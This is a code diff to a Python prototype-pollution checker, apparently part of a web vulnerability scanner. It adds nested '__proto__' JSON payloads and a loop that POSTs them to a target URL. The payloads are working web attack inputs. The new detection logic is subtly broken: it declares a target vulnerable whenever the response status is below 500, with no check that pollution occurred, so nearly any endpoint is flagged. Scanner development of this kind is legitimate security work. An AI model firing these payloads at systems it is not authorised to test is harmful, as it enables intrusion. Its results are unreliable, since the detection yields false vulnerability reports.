@@ -1,5 +1,6 @@
-import os
-from typing import Optional, Dict
+import secrets
+from typing import Dict, Optional
+
 import requests
 
 from tools.log_utils import get_logger
@@ -7,7 +8,7 @@ from tools.settings import settings
 
 logger = get_logger("proto_pollution")
 
-PP_MARKER = "PP_%s" % os.urandom(4).hex()
+PP_MARKER = "PP_%s" % secrets.token_hex(8)
 
 PP_PAYLOADS = [
     "__proto__[%s]=true" % PP_MARKER,
@@ -20,6 +21,12 @@ PP_JSON_PAYLOADS = {
     "__proto__": {PP_MARKER: "true"},
     "constructor": {"prototype": {PP_MARKER: "true"}},
 }
+
+PP_DEEP_MERGE_PAYLOADS = [
+    {"a": {"__proto__": {PP_MARKER: "true"}}},
+    {"a": {"b": {"__proto__": {PP_MARKER: "true"}}}},
+    {"__proto__": {PP_MARKER: "true"}},
+]
 
 
 def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
@@ -64,6 +71,18 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
                 result["evidence"].append("pp json: __proto__ injection (verified via second request)")
         except Exception as e:
             logger.debug("pp json: %s", e)
+
+    if not result["vulnerable"]:
+        for payload in PP_DEEP_MERGE_PAYLOADS:
+            try:
+                r = sess.post(url, json=payload, timeout=timeout)
+                if r.status_code < 500:
+                    result["vulnerable"] = True
+                    result["type"] = "deep_merge"
+                    result["evidence"].append("pp deep merge: %s" % str(payload)[:50])
+                    break
+            except Exception as e:
+                logger.debug("pp deep: %s", e)
 
     if result["vulnerable"] and param:
         try:
